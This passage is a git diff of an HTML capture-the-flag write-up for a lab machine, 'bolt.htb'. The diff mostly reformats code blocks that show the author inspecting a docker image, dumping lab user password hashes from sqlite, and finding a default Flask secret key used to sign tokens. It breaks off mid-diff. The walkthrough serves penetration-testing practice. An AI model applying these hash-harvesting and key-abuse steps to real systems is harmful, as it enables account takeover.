@@ -419,66 +419,66 @@ Merge branch 'common' into develop
 <h2 id="docker-image">docker image</h2>
 <p>On the download page of the website, we are invited to try the service by downloading a docker image. Exploring the image reveals the name of the vendor<code>appseed</code>, and the underlying technology <code>python flask</code>:</p>
 <p>cat repositories | jq</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;flask-dashboard-adminlte_appseed-app&#34;</span>: {
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;latest&#34;</span>: <span style="color:#f1fa8c">&#34;3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162&#34;</span>
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#ff79c6">&#34;flask-dashboard-adminlte_appseed-app&#34;</span>: {
+    <span style="color:#ff79c6">&#34;latest&#34;</span>: <span style="color:#f1fa8c">&#34;3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162&#34;</span>
+  }
+}
+</code></pre></td></tr></table>
 </div>
 </div><p>cat manifest.json | jq</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
-</span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;Config&#34;</span>: <span style="color:#f1fa8c">&#34;859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;RepoTags&#34;</span>: [<span style="color:#f1fa8c">&#34;flask-dashboard-adminlte_appseed-app:latest&#34;</span>],
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;Layers&#34;</span>: [
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar&#34;</span>,
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar&#34;</span>,
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar&#34;</span>,
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar&#34;</span>,
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar&#34;</span>,
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar&#34;</span>,
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar&#34;</span>,
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar&#34;</span>,
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar&#34;</span>,
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar&#34;</span>,
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar&#34;</span>
-</span></span><span style="display:flex;"><span>    ]
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>]
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[
+  {
+    <span style="color:#ff79c6">&#34;Config&#34;</span>: <span style="color:#f1fa8c">&#34;859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json&#34;</span>,
+    <span style="color:#ff79c6">&#34;RepoTags&#34;</span>: [<span style="color:#f1fa8c">&#34;flask-dashboard-adminlte_appseed-app:latest&#34;</span>],
+    <span style="color:#ff79c6">&#34;Layers&#34;</span>: [
+      <span style="color:#f1fa8c">&#34;187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar&#34;</span>,
+      <span style="color:#f1fa8c">&#34;745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar&#34;</span>,
+      <span style="color:#f1fa8c">&#34;41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar&#34;</span>,
+      <span style="color:#f1fa8c">&#34;d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar&#34;</span>,
+      <span style="color:#f1fa8c">&#34;3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar&#34;</span>,
+      <span style="color:#f1fa8c">&#34;9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar&#34;</span>,
+      <span style="color:#f1fa8c">&#34;1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar&#34;</span>,
+      <span style="color:#f1fa8c">&#34;a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar&#34;</span>,
+      <span style="color:#f1fa8c">&#34;3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar&#34;</span>,
+      <span style="color:#f1fa8c">&#34;2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar&#34;</span>,
+      <span style="color:#f1fa8c">&#34;3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar&#34;</span>
+    ]
+  }
+]
+</code></pre></td></tr></table>
 </div>
 </div><p>To Explore the content of the application, we have to Import the archived docker image. It is as simples as <a href="https://computingforgeeks.com/how-to-export-and-import-docker-images-containers/">this</a>:</p>
 <pre><code>docker load &lt; /tmp/image.tar
@@ -534,61 +534,61 @@ _ Debugger is active! \* Debugger PIN: 959-707-878
 </code></pre>
 <p>it opens <a href="https://github.com/app-generator/flask-dashboard-adminlte">AdminLTE</a> which is an open source product. According to <strong>Adminlte.js</strong>, the current version is: <code>AdminLTE v3.1.0-pre</code>.</p>
 <p>Exploring the sqlite database, leads to Nothing as it contains only users I have registered.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sqlite3
-</span></span><span style="display:flex;"><span>SQLite <span style="color:#ff79c6">version</span> <span style="color:#bd93f9">3</span>.<span style="color:#bd93f9">28</span>.<span style="color:#bd93f9">0</span> <span style="color:#bd93f9">2019</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span> <span style="color:#bd93f9">19</span>:<span style="color:#bd93f9">49</span>:<span style="color:#bd93f9">53</span>
-</span></span><span style="display:flex;"><span>Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">usage</span> hints.
-</span></span><span style="display:flex;"><span>Connected <span style="color:#ff79c6">to</span> a transient <span style="color:#ff79c6">in</span><span style="color:#ff79c6">-</span>memory <span style="color:#ff79c6">database</span>.
-</span></span><span style="display:flex;"><span>Use <span style="color:#f1fa8c">&#34;.open FILENAME&#34;</span> <span style="color:#ff79c6">to</span> reopen <span style="color:#ff79c6">on</span> a persistent <span style="color:#ff79c6">database</span>.
-</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> attach <span style="color:#f1fa8c">&#34;db.sqlite3&#34;</span> <span style="color:#ff79c6">as</span> db
-</span></span><span style="display:flex;"><span>   ...<span style="color:#ff79c6">&gt;</span> ;
-</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> .databases
-</span></span><span style="display:flex;"><span>main:
-</span></span><span style="display:flex;"><span>db: <span style="color:#ff79c6">/</span>private<span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>db.sqlite3
-</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> .tables
-</span></span><span style="display:flex;"><span>db.<span style="color:#ff79c6">User</span>
-</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">from</span> db.<span style="color:#ff79c6">User</span>;
-</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">|</span>test<span style="color:#ff79c6">|</span>test<span style="color:#ff79c6">@</span>bolt.htb<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$XztGk033$PKNqG2O072NwJfcwXDdXN<span style="color:#ff79c6">/||</span>
-</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">|</span>AAAA<span style="color:#ff79c6">|</span>a<span style="color:#ff79c6">@</span>a.a<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$cArj<span style="color:#ff79c6">/</span><span style="color:#bd93f9">7</span>IZ$zFaX0xwzA1d0AEPMguFA7.<span style="color:#ff79c6">||</span>BBBB
-</span></span><span style="display:flex;"><span>sqlite<span style="color:#ff79c6">&gt;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">sqlite3
+SQLite <span style="color:#ff79c6">version</span> <span style="color:#bd93f9">3</span>.<span style="color:#bd93f9">28</span>.<span style="color:#bd93f9">0</span> <span style="color:#bd93f9">2019</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span> <span style="color:#bd93f9">19</span>:<span style="color:#bd93f9">49</span>:<span style="color:#bd93f9">53</span>
+Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">usage</span> hints.
+Connected <span style="color:#ff79c6">to</span> a transient <span style="color:#ff79c6">in</span><span style="color:#ff79c6">-</span>memory <span style="color:#ff79c6">database</span>.
+Use <span style="color:#f1fa8c">&#34;.open FILENAME&#34;</span> <span style="color:#ff79c6">to</span> reopen <span style="color:#ff79c6">on</span> a persistent <span style="color:#ff79c6">database</span>.
+sqlite<span style="color:#ff79c6">&gt;</span> attach <span style="color:#f1fa8c">&#34;db.sqlite3&#34;</span> <span style="color:#ff79c6">as</span> db
+   ...<span style="color:#ff79c6">&gt;</span> ;
+sqlite<span style="color:#ff79c6">&gt;</span> .databases
+main:
+db: <span style="color:#ff79c6">/</span>private<span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>db.sqlite3
+sqlite<span style="color:#ff79c6">&gt;</span> .tables
+db.<span style="color:#ff79c6">User</span>
+sqlite<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">from</span> db.<span style="color:#ff79c6">User</span>;
+<span style="color:#bd93f9">1</span><span style="color:#ff79c6">|</span>test<span style="color:#ff79c6">|</span>test<span style="color:#ff79c6">@</span>bolt.htb<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$XztGk033$PKNqG2O072NwJfcwXDdXN<span style="color:#ff79c6">/||</span>
+<span style="color:#bd93f9">2</span><span style="color:#ff79c6">|</span>AAAA<span style="color:#ff79c6">|</span>a<span style="color:#ff79c6">@</span>a.a<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$cArj<span style="color:#ff79c6">/</span><span style="color:#bd93f9">7</span>IZ$zFaX0xwzA1d0AEPMguFA7.<span style="color:#ff79c6">||</span>BBBB
+sqlite<span style="color:#ff79c6">&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>Looking at source code <strong>config.py</strong>, we find at row 14:</p>
 <pre><code>SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007')
 </code></pre>
 <p>This secret key is used in <strong>app/home/routes.py</strong> at row 16 to serialize strings:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#ff79c6">..</span>]
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> itsdangerous <span style="color:#ff79c6">import</span> URLSafeTimedSerializer
-</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">..</span>]
-</span></span><span style="display:flex;"><span>ts <span style="color:#ff79c6">=</span> URLSafeTimedSerializer(app<span style="color:#ff79c6">.</span>config[<span style="color:#f1fa8c">&#34;SECRET_KEY&#34;</span>])
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#ff79c6">..</span>]
+<span style="color:#ff79c6">from</span> itsdangerous <span style="color:#ff79c6">import</span> URLSafeTimedSerializer
+[<span style="color:#ff79c6">..</span>]
+ts <span style="color:#ff79c6">=</span> URLSafeTimedSerializer(app<span style="color:#ff79c6">.</span>config[<span style="color:#f1fa8c">&#34;SECRET_KEY&#34;</span>])
+</code></pre></td></tr></table>
 </div>
 </div><p>from this file, new routes we did not identify with gobuster can be explored.</p>
 <table>
@@ -614,82 +614,82 @@ _ Debugger is active! \* Debugger PIN: 959-707-878
 </tbody>
 </table>
 <p>The last route is interesting because we have the source code to create a token for a specific user as well as retrieve the username or email that has been safely tokenized:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
